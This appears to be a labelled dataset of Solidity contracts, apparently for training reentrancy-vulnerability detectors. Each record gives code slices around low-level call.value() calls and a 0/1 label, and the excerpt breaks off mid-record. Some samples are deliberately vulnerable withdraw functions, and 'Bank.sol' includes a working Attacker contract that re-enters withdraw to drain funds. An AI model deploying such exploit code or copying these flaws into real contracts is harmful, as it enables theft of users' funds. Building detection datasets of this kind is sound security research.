{ require(wlcontract.whiteList(msg.sender)); require(wlcontract.whiteList(dst)); return super.transfer(dst, wad); } function transferFrom( address src, address dst, uint wad ) stoppable note returns (bool) { require(wlcontract.whiteList(src)); require(wlcontract.whiteList(dst)); return super.transferFrom(src, dst, wad); } function approve(address guy, uint wad) stoppable note returns (bool) { require(wlcontract.whiteList(msg.sender)); require(wlcontract.whiteList(guy)); return super.approve(guy, wad); } function push(address dst, uint128 wad) returns (bool) { return transfer(dst, wad); } function pull(address src, uint128 wad) returns (bool) { return transferFrom(src, msg.sender, wad); } function mint(uint128 wad) auth stoppable note { require(wlcontract.whiteList(msg.sender)); _balances[msg.sender] = add(_balances[msg.sender], wad); _supply = add(_supply, wad); } function burn(uint128 wad) auth stoppable note { require(wlcontract.whiteList(msg.sender)); _balances[msg.sender] = sub(_balances[msg.sender], wad); _supply = sub(_supply, wad); } bytes32   public  name = \"\"; function setName(bytes32 name_) auth { name = name_; } } "}
{"sol name": "32605.sol", "label": 0, "first path": "function forward(address destination, uint value, bytes data) public onlyOwner { require(destination.call.value(value)(data)); Forwarded(destination, value, data); contract MetaIdentityManager { uint adminTimeLock; uint userTimeLock; uint adminRate; address relay; event LogIdentityCreated( address indexed identity, address indexed creator, address owner, address indexed recoveryKey); event LogOwnerAdded( address indexed identity, address indexed owner, address instigator); event LogOwnerRemoved( address indexed identity, address indexed owner, address instigator); event LogRecoveryChanged( address indexed identity, address indexed recoveryKey, address instigator); event LogMigrationInitiated( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationCanceled( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationFinalized( address indexed identity, address indexed newIdManager, address instigator); mapping(address => mapping(address => uint)) owners; mapping(address => address) recoveryKeys; mapping(address => mapping(address => uint)) limiter; mapping(address => uint) public migrationInitiated; mapping(address => address) public migrationNewAddress; modifier onlyAuthorized() { require(msg.sender == relay || checkMessageData(msg.sender)); _; modifier onlyOwner(address identity, address sender) { require(isOwner(identity, sender)); _; modifier onlyOlderOwner(address identity, address sender) { require(isOlderOwner(identity, sender)); _; modifier onlyRecovery(address identity, address sender) { require(recoveryKeys[identity] == sender); _; modifier rateLimited(Proxy identity, address sender) { require(limiter[identity][sender] < (now - adminRate)); limiter[identity][sender] = now; _; modifier validAddress(address addr) { require(addr != address(0)); _; function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) { Proxy identity = new Proxy(); owners[identity][owner] = now - adminTimeLock; recoveryKeys[identity] = recoveryKey; LogIdentityCreated(identity, msg.sender, owner,  recoveryKey); identity.forward(destination, 0, data); function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){ identity.forward(destination, value, data); ", "second path": "function forward(address destination, uint value, bytes data) public onlyOwner { require(destination.call.value(value)(data)); Forwarded(destination, value, data); contract MetaIdentityManager { uint adminTimeLock; uint userTimeLock; uint adminRate; address relay; event LogIdentityCreated( address indexed identity, address indexed creator, address owner, address indexed recoveryKey); event LogOwnerAdded( address indexed identity, address indexed owner, address instigator); event LogOwnerRemoved( address indexed identity, address indexed owner, address instigator); event LogRecoveryChanged( address indexed identity, address indexed recoveryKey, address instigator); event LogMigrationInitiated( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationCanceled( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationFinalized( address indexed identity, address indexed newIdManager, address instigator); mapping(address => mapping(address => uint)) owners; mapping(address => address) recoveryKeys; mapping(address => mapping(address => uint)) limiter; mapping(address => uint) public migrationInitiated; mapping(address => address) public migrationNewAddress; modifier onlyAuthorized() { require(msg.sender == relay || checkMessageData(msg.sender)); _; modifier onlyOwner(address identity, address sender) { require(isOwner(identity, sender)); _; modifier onlyOlderOwner(address identity, address sender) { require(isOlderOwner(identity, sender)); _; modifier onlyRecovery(address identity, address sender) { require(recoveryKeys[identity] == sender); _; modifier rateLimited(Proxy identity, address sender) { require(limiter[identity][sender] < (now - adminRate)); limiter[identity][sender] = now; _; modifier validAddress(address addr) { require(addr != address(0)); _; function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) { Proxy identity = new Proxy(); owners[identity][owner] = now - adminTimeLock; recoveryKeys[identity] = recoveryKey; LogIdentityCreated(identity, msg.sender, owner,  recoveryKey); identity.forward(destination, 0, data); function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){ identity.forward(destination, value, data); ", "third path": "function forward(address destination, uint value, bytes data) public onlyOwner { require(destination.call.value(value)(data)); Forwarded(destination, value, data); contract MetaIdentityManager { uint adminTimeLock; uint userTimeLock; uint adminRate; address relay; event LogIdentityCreated( address indexed identity, address indexed creator, address owner, address indexed recoveryKey); event LogOwnerAdded( address indexed identity, address indexed owner, address instigator); event LogOwnerRemoved( address indexed identity, address indexed owner, address instigator); event LogRecoveryChanged( address indexed identity, address indexed recoveryKey, address instigator); event LogMigrationInitiated( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationCanceled( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationFinalized( address indexed identity, address indexed newIdManager, address instigator); mapping(address => mapping(address => uint)) owners; mapping(address => address) recoveryKeys; mapping(address => mapping(address => uint)) limiter; mapping(address => uint) public migrationInitiated; mapping(address => address) public migrationNewAddress; modifier onlyAuthorized() { require(msg.sender == relay || checkMessageData(msg.sender)); _; modifier onlyOwner(address identity, address sender) { require(isOwner(identity, sender)); _; modifier onlyOlderOwner(address identity, address sender) { require(isOlderOwner(identity, sender)); _; modifier onlyRecovery(address identity, address sender) { require(recoveryKeys[identity] == sender); _; modifier rateLimited(Proxy identity, address sender) { require(limiter[identity][sender] < (now - adminRate)); limiter[identity][sender] = now; _; modifier validAddress(address addr) { require(addr != address(0)); _; function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) { Proxy identity = new Proxy(); owners[identity][owner] = now - adminTimeLock; recoveryKeys[identity] = recoveryKey; LogIdentityCreated(identity, msg.sender, owner,  recoveryKey); identity.forward(destination, 0, data); function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){ identity.forward(destination, value, data); ", "long path": "pragma solidity ^0.4.15; contract Owned { address public owner; modifier onlyOwner() { require(isOwner(msg.sender)); _; } function Owned() { owner = msg.sender; } function isOwner(address addr) public returns(bool) { return addr == owner; } function transfer(address newOwner) public onlyOwner { if (newOwner != address(this)) { owner = newOwner; } } } contract Proxy is Owned { event Forwarded (address indexed destination, uint value, bytes data); event Received (address indexed sender, uint value); function () payable { Received(msg.sender, msg.value); } function forward(address destination, uint value, bytes data) public onlyOwner { require(destination.call.value(value)(data)); Forwarded(destination, value, data); } } contract MetaIdentityManager { uint adminTimeLock; uint userTimeLock; uint adminRate; address relay; event LogIdentityCreated( address indexed identity, address indexed creator, address owner, address indexed recoveryKey); event LogOwnerAdded( address indexed identity, address indexed owner, address instigator); event LogOwnerRemoved( address indexed identity, address indexed owner, address instigator); event LogRecoveryChanged( address indexed identity, address indexed recoveryKey, address instigator); event LogMigrationInitiated( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationCanceled( address indexed identity, address indexed newIdManager, address instigator); event LogMigrationFinalized( address indexed identity, address indexed newIdManager, address instigator); mapping(address => mapping(address => uint)) owners; mapping(address => address) recoveryKeys; mapping(address => mapping(address => uint)) limiter; mapping(address => uint) public migrationInitiated; mapping(address => address) public migrationNewAddress; modifier onlyAuthorized() { require(msg.sender == relay || checkMessageData(msg.sender)); _; } modifier onlyOwner(address identity, address sender) { require(isOwner(identity, sender)); _; } modifier onlyOlderOwner(address identity, address sender) { require(isOlderOwner(identity, sender)); _; } modifier onlyRecovery(address identity, address sender) { require(recoveryKeys[identity] == sender); _; } modifier rateLimited(Proxy identity, address sender) { require(limiter[identity][sender] < (now - adminRate)); limiter[identity][sender] = now; _; } modifier validAddress(address addr) { require(addr != address(0)); _; } function MetaIdentityManager(uint _userTimeLock, uint _adminTimeLock, uint _adminRate, address _relayAddress) { require(_adminTimeLock >= _userTimeLock); adminTimeLock = _adminTimeLock; userTimeLock = _userTimeLock; adminRate = _adminRate; relay = _relayAddress; } function createIdentity(address owner, address recoveryKey) public validAddress(recoveryKey) { Proxy identity = new Proxy(); owners[identity][owner] = now - adminTimeLock; recoveryKeys[identity] = recoveryKey; LogIdentityCreated(identity, msg.sender, owner,  recoveryKey); } function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) { Proxy identity = new Proxy(); owners[identity][owner] = now - adminTimeLock; recoveryKeys[identity] = recoveryKey; LogIdentityCreated(identity, msg.sender, owner,  recoveryKey); identity.forward(destination, 0, data); } function registerIdentity(address owner, address recoveryKey) public validAddress(recoveryKey) { require(recoveryKeys[msg.sender] == 0); owners[msg.sender][owner] = now - adminTimeLock; recoveryKeys[msg.sender] = recoveryKey; LogIdentityCreated(msg.sender, msg.sender, owner, recoveryKey); } function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){ identity.forward(destination, value, data); } function addOwner(address sender, Proxy identity, address newOwner) public onlyAuthorized onlyOlderOwner(identity, sender) rateLimited(identity, sender) { require(!isOwner(identity, newOwner)); owners[identity][newOwner] = now - userTimeLock; LogOwnerAdded(identity, newOwner, sender); } function addOwnerFromRecovery(address sender, Proxy identity, address newOwner) public onlyAuthorized onlyRecovery(identity, sender) rateLimited(identity, sender) { require(!isOwner(identity, newOwner)); owners[identity][newOwner] = now; LogOwnerAdded(identity, newOwner, sender); } function removeOwner(address sender, Proxy identity, address owner) public onlyAuthorized onlyOlderOwner(identity, sender) rateLimited(identity, sender) { require(sender != owner); delete owners[identity][owner]; LogOwnerRemoved(identity, owner, sender); } function changeRecovery(address sender, Proxy identity, address recoveryKey) public onlyAuthorized onlyOlderOwner(identity, sender) rateLimited(identity, sender) validAddress(recoveryKey) { recoveryKeys[identity] = recoveryKey; LogRecoveryChanged(identity, recoveryKey, sender); } function initiateMigration(address sender, Proxy identity, address newIdManager) public onlyAuthorized onlyOlderOwner(identity, sender) { migrationInitiated[identity] = now; migrationNewAddress[identity] = newIdManager; LogMigrationInitiated(identity, newIdManager, sender); } function cancelMigration(address sender, Proxy identity) public onlyAuthorized onlyOwner(identity, sender) { address canceledManager = migrationNewAddress[identity]; delete migrationInitiated[identity]; delete migrationNewAddress[identity]; LogMigrationCanceled(identity, canceledManager, sender); } function finalizeMigration(address sender, Proxy identity) onlyAuthorized onlyOlderOwner(identity, sender) { require(migrationInitiated[identity] != 0 && migrationInitiated[identity] + adminTimeLock < now); address newIdManager = migrationNewAddress[identity]; delete migrationInitiated[identity]; delete migrationNewAddress[identity]; identity.transfer(newIdManager); delete recoveryKeys[identity]; delete owners[identity][sender]; LogMigrationFinalized(identity, newIdManager, sender); } function checkMessageData(address a) internal constant returns (bool t) { if (msg.data.length < 36) return false; assembly { let mask := 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF t := eq(a, and(mask, calldataload(4))) } } function isOwner(address identity, address owner) public constant returns (bool) { return (owners[identity][owner] > 0 && (owners[identity][owner] + userTimeLock) <= now); } function isOlderOwner(address identity, address owner) public constant returns (bool) { return (owners[identity][owner] > 0 && (owners[identity][owner] + adminTimeLock) <= now); } function isRecovery(address identity, address recoveryKey) public constant returns (bool) { return recoveryKeys[identity] == recoveryKey; } } "}
{"sol name": "22416.sol", "label": 0, "first path": "function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable { if(Holders[_addr]>0)  { if(_addr.call.value(_wei)()){ Holders[_addr]-=_wei; ", "second path": "function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable { if(Holders[_addr]>0)  { if(_addr.call.value(_wei)()){ Holders[_addr]-=_wei; ", "third path": "function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable { if(Holders[_addr]>0)  { if(_addr.call.value(_wei)()){ Holders[_addr]-=_wei; ", "long path": "pragma solidity ^0.4.19; contract Ownable { address newOwner; address owner = msg.sender; function changeOwner(address addr) public onlyOwner { newOwner = addr; } function confirmOwner() public { if(msg.sender==newOwner) { owner=newOwner; } } modifier onlyOwner { if(owner == msg.sender)_; } } contract Token is Ownable { address owner = msg.sender; function WithdrawToken(address token, uint256 amount,address to) public onlyOwner { token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); } } contract TokenBank is Token { uint public MinDeposit; mapping (address => uint) public Holders; function initTokenBank() public { owner = msg.sender; MinDeposit = 1 ether; } function() payable { Deposit(); } function Deposit() payable { if(msg.value>MinDeposit) { Holders[msg.sender]+=msg.value; } } function WitdrawTokenToHolder(address _to,address _token,uint _amount)    public    onlyOwner    { if(Holders[_to]>0)        { Holders[_to]=0; WithdrawToken(_token,_amount,_to); } } function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable { if(Holders[_addr]>0)  { if(_addr.call.value(_wei)()){ Holders[_addr]-=_wei; } } } } "}
{"sol name": "40090.sol", "label": 0, "first path": "function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) { return _to.call.value(_value)(_data); function() returns(bool) { return multiAccessCall(multiAccessRecipient, msg.value, msg.data); function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) { return this.multiAccessCallD(_to, _value, _data, msg.sender); ", "second path": "function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) { return _to.call.value(_value)(_data); function() returns(bool) { return multiAccessCall(multiAccessRecipient, msg.value, msg.data); function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) { return this.multiAccessCallD(_to, _value, _data, msg.sender); ", "third path": "function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) { return _to.call.value(_value)(_data); function() returns(bool) { return multiAccessCall(multiAccessRecipient, msg.value, msg.data); function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) { return this.multiAccessCallD(_to, _value, _data, msg.sender); ", "long path": "contract Delegate { mapping(address => mapping(address => bool)) public senderDelegates; modifier onlyDelegate(address _sender) { if (_sender == msg.sender || address(this) == msg.sender || senderDelegates[_sender][msg.sender]) { _; } } function setDelegate(address _delegate, bool _trust) returns(bool) { senderDelegates[msg.sender][_delegate] = _trust; return true; } } contract MultiAccess is Delegate { address public multiAccessRecipient; struct PendingOperation { bool[] ownersDone; uint yetNeeded; bytes32 op; } struct PendingState { PendingOperation[] pending; mapping(bytes32 => uint) pendingIndex; } mapping(uint => PendingState) pendingState; uint currentPendingState; uint public multiAccessRequired; mapping(address => uint) ownerIndex; address[] public multiAccessOwners; event Confirmation(address indexed owner, bytes32 indexed operation, bool completed); event Revoke(address owner, bytes32 operation); event OwnerChanged(address oldOwner, address newOwner); event OwnerAdded(address newOwner); event OwnerRemoved(address oldOwner); event RequirementChanged(uint newRequirement); function MultiAccess() { multiAccessOwners.length = 2; multiAccessOwners[1] = msg.sender; ownerIndex[msg.sender] = 1; multiAccessRequired = 1; pendingState[0].pending.length = 1; } function _state() internal constant returns(PendingState storage) { return pendingState[currentPendingState]; } function multiAccessHasConfirmed(bytes32 _operation, address _owner) constant returns(bool) { uint pos = _state().pendingIndex[_operation]; if (pos == 0) { return false; } uint index = ownerIndex[_owner]; var pendingOp = _state().pending[pos]; if (index >= pendingOp.ownersDone.length) { return false; } return pendingOp.ownersDone[index]; } function multiAccessGetOwners() constant returns(address[]) { address[] memory owners = new address[](multiAccessOwners.length - 1); for (uint i = 1; i < multiAccessOwners.length; i++) { owners[i-1] = multiAccessOwners[i]; } return owners; } modifier onlyowner(address _owner) { if (multiAccessIsOwner(_owner)) { _; } } modifier onlymanyowners(address _owner, bytes32 _operation) { if (_confirmAndCheck(_owner, _operation)) { _; } } function _confirmAndCheck(address _owner, bytes32 _operation) onlyowner(_owner) internal returns(bool) { uint index = ownerIndex[_owner]; if (multiAccessHasConfirmed(_operation, _owner)) { return false; } uint pos = _state().pendingIndex[_operation]; if (pos == 0) { pos = _state().pending.length++; _state().pending[pos].yetNeeded = multiAccessRequired; _state().pending[pos].op = _operation; _state().pendingIndex[_operation] = pos; } var pendingOp = _state().pending[pos]; if (pendingOp.yetNeeded <= 1) { Confirmation(_owner, _operation, true); _removeOperation(_operation); return true; } else { Confirmation(_owner, _operation, false); pendingOp.yetNeeded--; if (index >= pendingOp.ownersDone.length) { pendingOp.ownersDone.length = index+1; } pendingOp.ownersDone[index] = true; } return false; } function _incrementState() internal { currentPendingState++; pendingState[currentPendingState].pending.length++; } function _removeOperation(bytes32 _operation) internal { uint pos = _state().pendingIndex[_operation]; if (pos < _state().pending.length-1) { PendingOperation last = _state().pending[_state().pending.length-1]; _state().pending[pos] = last; _state().pendingIndex[last.op] = pos; } _state().pending.length--; delete _state().pendingIndex[_operation]; } function multiAccessIsOwner(address _addr) constant returns(bool) { return ownerIndex[_addr] > 0; } function multiAccessRevoke(bytes32 _operation) returns(bool) { return multiAccessRevokeD(_operation, msg.sender); } function multiAccessRevokeD(bytes32 _operation, address _sender) onlyDelegate(_sender) onlyowner(_sender) returns(bool) { uint index = ownerIndex[_sender]; if (!multiAccessHasConfirmed(_operation, _sender)) { return false; } var pendingOp = _state().pending[_state().pendingIndex[_operation]]; pendingOp.ownersDone[index] = false; pendingOp.yetNeeded++; if (pendingOp.yetNeeded == multiAccessRequired) { _removeOperation(_operation); } Revoke(_sender, _operation); return true; } function multiAccessChangeOwner(address _from, address _to) returns(bool) { return this.multiAccessChangeOwnerD(_from, _to, msg.sender); } function multiAccessChangeOwnerD(address _from, address _to, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _from, _to)) returns(bool) { if (multiAccessIsOwner(_to)) { return false; } uint index = ownerIndex[_from]; if (index == 0) { return false; } multiAccessOwners[index] = _to; delete ownerIndex[_from]; ownerIndex[_to] = index; _incrementState(); OwnerChanged(_from, _to); return true; } function multiAccessAddOwner(address _owner) returns(bool) { return this.multiAccessAddOwnerD(_owner, msg.sender); } function multiAccessAddOwnerD(address _owner, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _owner)) returns(bool) { if (multiAccessIsOwner(_owner)) { return false; } uint pos = multiAccessOwners.length++; multiAccessOwners[pos] = _owner; ownerIndex[_owner] = pos; OwnerAdded(_owner); return true; } function multiAccessRemoveOwner(address _owner) returns(bool) { return this.multiAccessRemoveOwnerD(_owner, msg.sender); } function multiAccessRemoveOwnerD(address _owner, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _owner)) returns(bool) { uint index = ownerIndex[_owner]; if (index == 0) { return false; } if (multiAccessRequired >= multiAccessOwners.length-1) { return false; } if (index < multiAccessOwners.length-1) { address last = multiAccessOwners[multiAccessOwners.length-1]; multiAccessOwners[index] = last; ownerIndex[last] = index; } multiAccessOwners.length--; delete ownerIndex[_owner]; _incrementState(); OwnerRemoved(_owner); return true; } function multiAccessChangeRequirement(uint _newRequired) returns(bool) { return this.multiAccessChangeRequirementD(_newRequired, msg.sender); } function multiAccessChangeRequirementD(uint _newRequired, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _newRequired)) returns(bool) { if (_newRequired == 0 || _newRequired > multiAccessOwners.length-1) { return false; } multiAccessRequired = _newRequired; _incrementState(); RequirementChanged(_newRequired); return true; } function multiAccessSetRecipient(address _address) returns(bool) { return this.multiAccessSetRecipientD(_address, msg.sender); } function multiAccessSetRecipientD(address _address, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _address)) returns(bool) { multiAccessRecipient = _address; return true; } function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) { return this.multiAccessCallD(_to, _value, _data, msg.sender); } function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) { return _to.call.value(_value)(_data); } function() returns(bool) { return multiAccessCall(multiAccessRecipient, msg.value, msg.data); } } "}
{"sol name": "Bank.sol", "label": 1, "first path": "function withdraw(){ require(msg.sender.call.value(balances[msg.sender])()); balances[msg.sender]=0; contract Attacker{ address public bankAddr; uint attackCount = 0; constructor(address _bank){ bankAddr = _bank; ", "second path": "function withdraw(){ require(msg.sender.call.value(balances[msg.sender])()); balances[msg.sender]=0; contract Attacker{ address public bankAddr; uint attackCount = 0; constructor(address _bank){ bankAddr = _bank; ", "third path": "function withdraw(){ require(msg.sender.call.value(balances[msg.sender])()); balances[msg.sender]=0; contract Attacker{ address public bankAddr; uint attackCount = 0; constructor(address _bank){ bankAddr = _bank; ", "long path": "pragma solidity ^0.4.24; contract Bank{ mapping (address => uint256) public balances; function wallet() constant returns(uint256 result){ return this.balance; } function recharge() payable{ balances[msg.sender]+=msg.value; } function withdraw(){ require(msg.sender.call.value(balances[msg.sender])()); balances[msg.sender]=0; } } contract Attacker{ address public bankAddr; uint attackCount = 0; constructor(address _bank){ bankAddr = _bank; } function attack() payable{ attackCount = 0; Bank bank = Bank(bankAddr); bank.recharge.value(msg.value)(); bank.withdraw(); } function () payable{ if(msg.sender==bankAddr&&attackCount<5){ attackCount+=1; Bank bank = Bank(bankAddr); bank.withdraw(); } } function wallet() constant returns(uint256 result){ return this.balance; } } "}
{"sol name": "dumbDAO.sol", "label": 1, "first path": "function withdraw(address _recipient) returns (bool) { if (balances[msg.sender] == 0){ InsufficientFunds(balances[msg.sender],balances[msg.sender]); throw; PaymentCalled(_recipient, balances[msg.sender]); if (_recipient.call.value(balances[msg.sender])()) { balances[msg.sender] = 0; return true; ", "second path": "function withdraw(address _recipient) returns (bool) { if (balances[msg.sender] == 0){ InsufficientFunds(balances[msg.sender],balances[msg.sender]); throw; PaymentCalled(_recipient, balances[msg.sender]); if (_recipient.call.value(balances[msg.sender])()) { balances[msg.sender] = 0; return true; ", "third path": "function withdraw(address _recipient) returns (bool) { if (balances[msg.sender] == 0){ InsufficientFunds(balances[msg.sender],balances[msg.sender]); throw; PaymentCalled(_recipient, balances[msg.sender]); if (_recipient.call.value(balances[msg.sender])()) { balances[msg.sender] = 0; return true; ", "long path": "contract dumbDAO { event PaymentCalled(address payee, uint amount); event TokensBought(address buyer, uint amount); event TokensTransfered(address from, address to, uint amount); event InsufficientFunds(uint bal, uint amount); mapping (address => uint) public balances; function buyTokens(){ balances[msg.sender] += msg.value; TokensBought(msg.sender, msg.value); } function transferTokens(address _to, uint _amount){ if (balances[msg.sender] < _amount) throw; balances[_to]=_amount; balances[msg.sender]-=_amount; TokensTransfered(msg.sender, _to, _amount); } function withdraw(address _recipient) returns (bool) { if (balances[msg.sender] == 0){ InsufficientFunds(balances[msg.sender],balances[msg.sender]); throw; } PaymentCalled(_recipient, balances[msg.sender]); if (_recipient.call.value(balances[msg.sender])()) { balances[msg.sender] = 0; return true; } } } "}
{"sol name": "8342.sol", "label": 0, "first path": "function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) { return _to.call.value(_value).gas(_gas)(_code); ", "second path": "function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) { return _to.call.value(_value).gas(_gas)(_code); ", "third path": "function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) { return _to.call.value(_value).gas(_gas)(_code); ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); } function square(uint256 a) internal pure returns (uint256) { return mul(a, a); } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); } } contract ERC20Interface { event Transfer( address indexed from, address indexed to, uint256 value ); event Approval( address indexed owner, address indexed spender, uint256 value ); function totalSupply() public view returns (uint256); function balanceOf(address _owner) public view returns (uint256); function transfer(address _to, uint256 _value) public returns (bool); function transferFrom(address _from, address _to, uint256 _value) public returns (bool); function approve(address _spender, uint256 _value) public returns (bool); function allowance( address _owner, address _spender) public view returns (uint256); } contract CHStock is ERC20Interface { using SafeMath for uint256; event RedeemShares( address indexed user, uint256 shares, uint256 dividends ); string public name = \"ChickenHuntStock\"; string public symbol = \"CHS\"; uint8 public decimals = 18; uint256 public totalShares; uint256 public dividendsPerShare; uint256 public constant CORRECTION = 1 << 64; mapping (address => uint256) public ethereumBalance; mapping (address => uint256) internal shares; mapping (address => uint256) internal refund; mapping (address => uint256) internal deduction; mapping (address => mapping (address => uint256)) internal allowed; function redeemShares() public { uint256 _shares = shares[msg.sender]; uint256 _dividends = dividendsOf(msg.sender); delete shares[msg.sender]; delete refund[msg.sender]; delete deduction[msg.sender]; totalShares = totalShares.sub(_shares); ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_dividends); emit RedeemShares(msg.sender, _shares, _dividends); } function transfer(address _to, uint256 _value) public returns (bool) { _transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_value <= allowed[_from][msg.sender]); allowed[_from][msg.sender] -= _value; _transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function dividendsOf(address _shareholder) public view returns (uint256) { return dividendsPerShare.mul(shares[_shareholder]).add(refund[_shareholder]).sub(deduction[_shareholder]) / CORRECTION; } function totalSupply() public view returns (uint256) { return totalShares; } function balanceOf(address _owner) public view returns (uint256) { return shares[_owner]; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function _giveShares(address _user, uint256 _ethereum) internal { if (_ethereum > 0) { totalShares = totalShares.add(_ethereum); deduction[_user] = deduction[_user].add(dividendsPerShare.mul(_ethereum)); shares[_user] = shares[_user].add(_ethereum); dividendsPerShare = dividendsPerShare.add(_ethereum.mul(CORRECTION) / totalShares); emit Transfer(address(0), _user, _ethereum); } } function _transfer(address _from, address _to, uint256 _value) internal { require(_to != address(0)); require(_value <= shares[_from]); uint256 _rawProfit = dividendsPerShare.mul(_value); uint256 _refund = refund[_from].add(_rawProfit); uint256 _min = _refund < deduction[_from] ? _refund : deduction[_from]; refund[_from] = _refund.sub(_min); deduction[_from] = deduction[_from].sub(_min); deduction[_to] = deduction[_to].add(_rawProfit); shares[_from] = shares[_from].sub(_value); shares[_to] = shares[_to].add(_value); emit Transfer(_from, _to, _value); } } contract CHGameBase is CHStock { struct House { Hunter hunter; uint256 huntingPower; uint256 offensePower; uint256 defensePower; uint256 huntingMultiplier; uint256 offenseMultiplier; uint256 defenseMultiplier; uint256 depots; uint256[] pets; } struct Hunter { uint256 strength; uint256 dexterity; uint256 constitution; uint256 resistance; } struct Store { address owner; uint256 cut; uint256 cost; uint256 balance; } Store public store; uint256 public devCut; uint256 public devFee; uint256 public altarCut; uint256 public altarFund; uint256 public dividendRate; uint256 public totalChicken; address public chickenTokenDelegator; mapping (address => uint256) public lastSaveTime; mapping (address => uint256) public savedChickenOf; mapping (address => House) internal houses; function saveChickenOf(address _user) public returns (uint256) { uint256 _unclaimedChicken = _unclaimedChickenOf(_user); totalChicken = totalChicken.add(_unclaimedChicken); uint256 _chicken = savedChickenOf[_user].add(_unclaimedChicken); savedChickenOf[_user] = _chicken; lastSaveTime[_user] = block.timestamp; return _chicken; } function transferChickenFrom(address _from, address _to, uint256 _value) public returns (bool) { require(msg.sender == chickenTokenDelegator); require(saveChickenOf(_from) >= _value); savedChickenOf[_from] = savedChickenOf[_from] - _value; savedChickenOf[_to] = savedChickenOf[_to].add(_value); return true; } function chickenOf(address _user) public view returns (uint256) { return savedChickenOf[_user].add(_unclaimedChickenOf(_user)); } function _payChicken(address _user, uint256 _chicken) internal { uint256 _unclaimedChicken = _unclaimedChickenOf(_user); uint256 _extraChicken; if (_chicken > _unclaimedChicken) { _extraChicken = _chicken - _unclaimedChicken; require(savedChickenOf[_user] >= _extraChicken); savedChickenOf[_user] -= _extraChicken; totalChicken -= _extraChicken; } else { _extraChicken = _unclaimedChicken - _chicken; totalChicken = totalChicken.add(_extraChicken); savedChickenOf[_user] += _extraChicken; } lastSaveTime[_user] = block.timestamp; } function _payEthereumAndDistribute(uint256 _cost) internal { require(_cost * 100 / 100 == _cost); _payEthereum(_cost); uint256 _toShareholders = _cost * dividendRate / 100; uint256 _toAltar = _cost * altarCut / 100; uint256 _toStore = _cost * store.cut / 100; devFee = devFee.add(_cost - _toShareholders - _toAltar - _toStore); _giveShares(msg.sender, _toShareholders); altarFund = altarFund.add(_toAltar); store.balance = store.balance.add(_toStore); } function _payEthereum(uint256 _cost) internal { uint256 _extra; if (_cost > msg.value) { _extra = _cost - msg.value; require(ethereumBalance[msg.sender] >= _extra); ethereumBalance[msg.sender] -= _extra; } else { _extra = msg.value - _cost; ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_extra); } } function _unclaimedChickenOf(address _user) internal view returns (uint256) { uint256 _timestamp = lastSaveTime[_user]; if (_timestamp > 0 && _timestamp < block.timestamp) { return houses[_user].huntingPower.mul( houses[_user].huntingMultiplier ).mul(block.timestamp - _timestamp) / 100; } else { return 0; } } function _houseOf(address _user) internal view returns (House storage _house) { _house = houses[_user]; require(_house.depots > 0); } } contract CHHunter is CHGameBase { event UpgradeHunter( address indexed user, string attribute, uint256 to ); struct Config { uint256 chicken; uint256 ethereum; uint256 max; } Config public typeA; 